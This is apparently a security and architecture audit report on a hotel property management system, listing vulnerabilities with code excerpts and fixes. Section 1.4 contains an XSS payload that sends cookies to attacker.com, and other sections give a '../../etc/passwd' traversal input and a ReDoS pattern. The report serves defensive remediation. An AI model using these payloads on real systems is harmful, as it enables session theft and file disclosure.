# Hotel PMS - Comprehensive Code Audit Report

**Date:** 2026-03-23
**Auditor:** CTO-Level Architecture & Security Review
**Scope:** Full-stack analysis — Backend, Frontend, Database, Business Logic, Security
**Codebase:** ~800+ source files, 176 models, 165 routes, 164 services, 400+ components

---

## Executive Summary

This hotel PMS is a **large-scale, feature-rich system** built on a modern stack (React 18 + Express + MongoDB + Redis). It covers booking, housekeeping, inventory, payments, OTA integration, multi-property management, and more. However, the audit reveals **critical security vulnerabilities, data integrity gaps, and architectural weaknesses** that must be addressed before production deployment at scale.

| Severity | Count | Key Areas |
|----------|-------|-----------|
| **CRITICAL** | 8 | Encryption, CORS, XSS, double-booking, payment validation |
| **HIGH** | 12 | Auth bypass, path traversal, missing transactions, no code splitting |
| **MEDIUM** | 25+ | Type safety, N+1 queries, debug logs, missing indexes |
| **LOW** | 15+ | Accessibility, code duplication, inconsistent patterns |

---

## 1. CRITICAL SECURITY VULNERABILITIES

### 1.1 Deprecated Encryption (CRITICAL)
**File:** `backend/src/services/encryptionService.js`
Uses `crypto.createCipher()` / `crypto.createDecipher()` — deprecated since Node.js v11.6.0 with weak key derivation (EVP_BytesToKey).

```javascript
// VULNERABLE:
const cipher = crypto.createCipher(this.algorithm, key, iv);
```

**Impact:** All encrypted PII, credentials, and financial data can be decrypted.
**Fix:** Replace with `crypto.createCipheriv()` / `crypto.createDecipheriv()` with explicit salt/IV.

### 1.2 Hardcoded Default Encryption Keys (CRITICAL)
**File:** `backend/src/services/encryptionService.js` (Lines 21-35)

```javascript
this.piiKey = this.deriveKey(
  process.env.PII_ENCRYPTION_KEY || 'default-pii-key-change-in-production', 'PII_ENCRYPTION'
);
```

**Impact:** If ENV vars aren't set, all encryption uses known default keys — total data compromise.
**Fix:** Fail-fast on startup if encryption keys are not configured.

### 1.3 CORS Allows All Origins with Credentials (CRITICAL)
**File:** `backend/src/server.js` (Lines 293-297)

```javascript
app.use(cors({ origin: "*", credentials: true }));
```

**Impact:** Any website can make authenticated requests to your API. CSRF and cross-origin attacks are trivial.
**Fix:** Whitelist specific origins: `origin: process.env.ALLOWED_ORIGINS?.split(',')`.

### 1.4 XSS via innerHTML with User Data (CRITICAL)
**Files:**
- `frontend/src/utils/DragDropManager.ts` (Lines 260-285)
- `frontend/src/components/tapechart/EnhancedTapeChartView.tsx` (Line 180)
- `frontend/src/components/admin/BillMessagePreview.tsx` (Lines 199-223, 524-526)
- `frontend/src/components/web/FormPreview.tsx` (Line 409)

```javascript
// Guest name directly injected into HTML:
dragImage.innerHTML = `<div>${reservation.guestName}</div>`;
```

**Impact:** A malicious guest name like `<img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">` executes JavaScript in staff browsers, stealing session tokens.
**Fix:** Use `textContent` or HTML-escape all user data before innerHTML.

### 1.5 Rate Limiting Disabled (CRITICAL)
**File:** `backend/src/server.js` (Line 311)

```javascript
// app.use('/api/', limiter); // Temporarily disabled for development
```

**Impact:** Brute-force attacks on login, API abuse, and DDoS are unmitigated.
**Fix:** Re-enable and configure per-endpoint rate limits.

### 1.6 Payment Amount Override (CRITICAL)
**File:** `backend/src/routes/payments.js` (Line 74)

```javascript
const paymentAmount = amount || booking.totalAmount * 100;
```

**Impact:** Client can send a lower `amount` parameter to pay less than owed. Direct financial loss.
**Fix:** Always derive amount from server-side booking record, never from client.

### 1.7 OTA Webhook Signature Not Verified (CRITICAL)
**File:** `backend/src/routes/otaWebhooks.js` (Lines 44-55)

```javascript
// TODO: Implement proper signature verification
if (process.env.NODE_ENV === 'production' && !signature) {
    return res.status(401).json({ error: 'Invalid webhook signature' });
}
```

**Impact:** Attackers can inject fake reservation/cancellation webhooks, creating ghost bookings or cancelling real ones.

### 1.8 Bypass Encryption Key Has Default (CRITICAL)
**File:** `backend/src/services/bypassSecurityService.js` (Line 10)

```javascript
this.encryptionKey = process.env.BYPASS_ENCRYPTION_KEY || 'default-bypass-encryption-key';
```

**Impact:** Admin bypass audit trail can be tampered with if default key is used.

---

## 2. HIGH SEVERITY ISSUES

### 2.1 No Double-Booking Protection (Race Condition)
**Files:** `backend/src/routes/bookings.js`, `backend/src/models/RoomAvailability.js`

The `bookRoomsWithLock()` method uses MongoDB sessions, but the **booking creation route does not wrap the full booking flow in a transaction**. Between checking availability and creating the booking, another request can book the same room.

**Impact:** Two guests booked into the same room on the same date.
**Fix:** Wrap the entire booking flow (availability check + booking creation + inventory update + payment) in a single MongoDB transaction with optimistic locking.

### 2.2 JWT Tokens in localStorage (HIGH)
**File:** `frontend/src/services/api.ts`, `frontend/src/context/AuthContext.tsx`

```javascript
localStorage.setItem('token', token);
```

**Impact:** Any XSS vulnerability (see 1.4) can steal JWT tokens. localStorage is accessible to all JavaScript on the page.
**Fix:** Use httpOnly cookies for token storage. Implement CSRF tokens for cookie-based auth.

### 2.3 No Token Refresh Mechanism (HIGH)
When JWT expires, the frontend simply redirects to login, losing all user state.

**Impact:** Poor UX and potential data loss for staff mid-workflow.
**Fix:** Implement refresh token rotation with short-lived access tokens (15min) and longer refresh tokens (7d).

### 2.4 Property Access Control Bypass (HIGH)
**File:** `backend/src/middleware/propertyAccess.js` (Lines 37-48)

```javascript
if (isReadOnlyRequest && isAdmin) {
    const property = await Hotel.findById(hotelId);
    if (property) { req.property = property; return next(); }
}
```

**Impact:** Any admin can view data from any property, regardless of ownership.
**Fix:** Validate admin's `properties[]` array includes the requested hotelId.

### 2.5 Path Traversal in File Upload (HIGH)
**File:** `backend/src/routes/upload.js` (Lines 74, 110)

```javascript
const oldAvatarPath = path.join(process.cwd(), req.user.avatar);
```

**Impact:** If `req.user.avatar` contains `../../etc/passwd`, arbitrary file read/delete is possible.
**Fix:** Validate the resolved path starts with the uploads directory.

### 2.6 TLS Certificate Validation Disabled (HIGH)
**File:** `backend/src/services/emailService.js` (Line 27)

```javascript
tls: { rejectUnauthorized: false }
```

**Impact:** MITM attacks on SMTP connections can intercept email content (password resets, booking confirmations).
**Fix:** Use proper TLS certificates in production. Only disable in development.

### 2.7 Allotment Route Admin Check Disabled (HIGH)
**File:** `backend/src/routes/allotment.js` (Line 478)

```javascript
// TODO: Re-enable admin role check in production
```

**Impact:** Non-admin users can modify room allotments.

### 2.8 No Code Splitting on Frontend (HIGH)
**File:** `frontend/src/App.tsx` — 250+ import statements, all loaded upfront.

**Impact:** Initial bundle likely 2-3MB+. Slow first load, especially on mobile/slow networks. Staff in rural hotel locations will have poor experience.
**Fix:** Use `React.lazy()` + `Suspense` for route-based code splitting.

### 2.9 Missing Transactions on Critical Operations (HIGH)
The following operations lack MongoDB transactions:
- Booking creation (booking + inventory + payment)
- Invoice generation (invoice + revenue account)
- Checkout process (multiple entity updates)
- Settlement (settlement + ledger posting)

**Impact:** Partial writes on failure leave data in inconsistent state.

### 2.10 Overbooking Validation Gap (HIGH)
**File:** `backend/src/models/RoomAvailability.js`

`availableRooms` is calculated as `totalRooms - soldRooms - blockedRooms + overbookedRooms`, but there's no pre-save validation that `soldRooms + blockedRooms` doesn't exceed `totalRooms + overbookedRooms`.

**Impact:** RoomAvailability can go negative, causing booking inconsistencies.

### 2.11 Regex DoS in Search (HIGH)
**File:** `backend/src/routes/admin.js` (Lines 28-32)

```javascript
query.$or = [
    { name: { $regex: search, $options: 'i' } },
    { 'address.city': { $regex: search, $options: 'i' } }
];
```

**Impact:** Crafted regex input like `(a+)+$` causes exponential backtracking, hanging the server.
**Fix:** Escape regex special characters or use MongoDB `$text` search with text indexes.

### 2.12 Debug Logging Exposes PII (HIGH)
**Files:** 100+ locations across frontend and backend

```javascript
console.log('🔍 DEBUG - Full request body:', JSON.stringify(req.body, null, 2));
console.log('🔍 BOOKING DEBUG - Hotel ID:', booking.hotelId?._id);
```

**Impact:** Guest names, emails, booking details, payment info logged to console in production.
**Fix:** Remove all debug console.log statements. Use Winston logger with proper log levels.

---

## 3. MEDIUM SEVERITY ISSUES

### 3.1 Database Layer

| Issue | Location | Impact |
|-------|----------|--------|
| No `checkOut > checkIn` validation | Booking model | Backward date bookings possible |
| No guest count vs capacity validation | Booking model | Overbooking rooms beyond capacity |
| Missing index on Payment.status | Payment model | Slow payment queries at scale |
| Missing index on User.role | User model | Slow staff filtering |
| Missing index on Invoice.bookingId | Invoice model | Slow invoice lookup |
| N+1 queries with `.populate()` | Booking routes | Performance degradation |
| DayUseBooking references non-existent 'Guest' model | DayUseBooking model | Runtime errors |
| Room status tracked in 3 places (Room, Housekeeping, Maintenance) | Multiple models | No single source of truth |
| Booking status has no state machine | Booking model | Invalid transitions possible (checked_out → confirmed) |
| Settlement escalation logic missing | Settlement model | escalationLevel field exists but no enforcement |

### 3.2 Frontend Layer

| Issue | Location | Impact |
|-------|----------|--------|
| 724+ `any` type usages | Throughout frontend | Type safety compromised |
| 50+ useState hooks in single components | AdminBookings.tsx | Excessive re-renders |
| No `useMemo`/`useCallback` optimization | Most components | Poor render performance |
| Two charting libraries (Chart.js + Recharts) | package.json | Unnecessary bundle bloat |
| No request timeout on Axios | api.ts | Hanging requests possible |
| No AbortController for cleanup | API calls | Memory leaks on unmount |
| Multiple direct fetch() calls bypass interceptor | 30+ locations | Auth headers missing |
| Hardcoded production URL in api.ts | api.ts | Should use env vars only |
| No CSRF tokens in forms | All forms | Cross-site request forgery |
| ReDoS in form validation | FormPreview.tsx (Line 126) | `new RegExp(rule.value)` with user input |

### 3.3 Backend Layer

| Issue | Location | Impact |
|-------|----------|--------|
| No pagination bounds validation | Multiple routes | Memory exhaustion with large `limit` |
| Inconsistent error responses | Various routes | Debugging difficulty |
| No HTTPS enforcement in production | server.js | Unencrypted traffic |
| Health check token in query string | health.js | Token visible in logs/history |
| Integration encryption key auto-generated | integrations.js | Won't persist across restarts |
| Missing GDPR right-to-erasure coverage | gdpr.js | Compliance risk |
| Idempotency only on booking creation | bookings.js | Double-charges on payment retry |

---

## 4. MISSING PMS FEATURES & BUSINESS LOGIC GAPS

### 4.1 Booking & Reservation

| Gap | Impact |
|-----|--------|
| No minimum/maximum length-of-stay enforcement | Revenue loss from 1-night bookings in peak season |
| No check-in/check-out time validation | Early check-in conflicts |
| No overbooking strategy configuration | No controlled overbooking for revenue optimization |
| No waitlist functionality | Lost bookings when fully booked |
| No group booking block management | Groups can't reserve without confirming |
| Missing `checkInBy` / `checkOutBy` fields | No staff accountability on operations |
| No booking modification audit trail | Cannot track who changed what |

### 4.2 Rate & Revenue Management

| Gap | Impact |
|-----|--------|
| No rate floor/ceiling validation | Rooms sold below cost or at absurd prices |
| No linked rate plan support | Corporate rates can't derive from BAR |
| No yield management rules engine | Manual rate changes only |
| No length-of-stay pricing | No discounts for longer stays |
| No day-of-week pricing | Weekend rates not automated |
| Missing revenue recognition date tracking | IFRS 15 compliance gap |

### 4.3 Financial & Accounting

| Gap | Impact |
|-----|--------|
| Booking amount vs Invoice total not validated | Financial discrepancies |
| No payment reconciliation status | Can't verify payments match settlements |
| No night audit process enforcement | Day-end closure not enforced |
| No fiscal year/period locking | Past periods can be modified |
| No multi-currency support at model level | International properties unsupported |

### 4.4 Operations

| Gap | Impact |
|-----|--------|
| No housekeeping quality inspection workflow | No QA sign-off on cleaned rooms |
| No maintenance SLA tracking | No escalation for overdue maintenance |
| No lost & found management | Guest property handling missing |
| No key card management integration | Physical key tracking absent |
| Room status split across 3 models | Conflicting room states |

### 4.5 Channel Management

| Gap | Impact |
|-----|--------|
| No automatic OTA sync scheduling | Manual sync only, stale availability |
| No conflict resolution for cross-channel overbooking | Overbooking across channels |
| No channel-specific rate management | Same rates across all channels |
| Webhook signature verification not implemented | Fake webhooks can manipulate data |

---

## 5. ARCHITECTURE CONCERNS

### 5.1 Monolithic Backend
The backend is a single Express app with 165 routes, 164 services, and 176 models. At this scale:
- **Deployment risk:** One bug takes down everything
- **Scaling bottleneck:** Can't scale booking engine independently of reporting
- **Recommendation:** Consider domain-based modular architecture or microservices for critical paths (booking, payments, channel sync)

### 5.2 No API Versioning Strategy
Routes use `/api/v1/` but there's no mechanism for versioned breaking changes.

### 5.3 No Event-Driven Architecture
Critical operations (booking created, payment received, guest checked in) should emit events for decoupled processing (notifications, analytics, sync). Currently, these are tightly coupled in route handlers.

### 5.4 No Caching Strategy for Read-Heavy Endpoints
Room availability, rate lookups, and hotel settings are queried frequently but not cached (despite Redis being available).

### 5.5 No Database Connection Retry
**File:** `backend/src/config/database.js`
If MongoDB connection fails on startup, the server continues with limited features but has no reconnection strategy.

---

## 6. PRIORITIZED REMEDIATION PLAN

### Phase 1: Security Hotfixes (Week 1-2)
1. Fix CORS to whitelist specific origins
2. Re-enable rate limiting
3. Fix encryption to use `createCipheriv()`
4. Remove all default encryption keys (fail-fast)
5. Sanitize all innerHTML/dangerouslySetInnerHTML
6. Validate payment amounts server-side only
7. Implement OTA webhook signature verification
8. Fix path traversal in file uploads
9. Remove all debug console.log statements

### Phase 2: Auth & Data Integrity (Week 3-4)
1. Move JWT to httpOnly cookies
2. Implement token refresh rotation
3. Add MongoDB transactions for booking flow
4. Add booking date validation (checkOut > checkIn)
5. Add overbooking threshold validation
6. Implement booking status state machine
7. Add pagination bounds validation
8. Re-enable admin role check on allotments
9. Fix property access control for multi-property

### Phase 3: Performance & Quality (Week 5-8)
1. Implement React.lazy() code splitting
2. Add missing database indexes
3. Add useMemo/useCallback to large components
4. Replace `any` types with proper interfaces (724 instances)
5. Consolidate charting libraries (pick one)
6. Add AbortController for API call cleanup
7. Implement Redis caching for read-heavy endpoints
8. Consolidate room status to single source of truth

### Phase 4: PMS Feature Gaps (Week 9-16)
1. Night audit process
2. Rate floor/ceiling enforcement
3. Length-of-stay and day-of-week pricing
4. Automatic OTA sync scheduling
5. Housekeeping QA workflow
6. Payment reconciliation
7. Booking modification audit trail
8. Multi-currency support

---

## 7. SUMMARY METRICS

| Metric | Value |
|--------|-------|
| Total files analyzed | 800+ |
| Critical vulnerabilities | 8 |
| High severity issues | 12 |
| Medium severity issues | 25+ |
| Missing PMS features | 30+ |
| `any` type usages | 724+ |
| Debug console.logs | 100+ |
| Models without transactions | 4 critical flows |
| Missing database indexes | 5+ high-traffic queries |
| Unimplemented TODOs in code | 15+ |

---

*This audit was conducted through static code analysis of all source files. Dynamic testing and penetration testing are recommended as follow-up actions.*
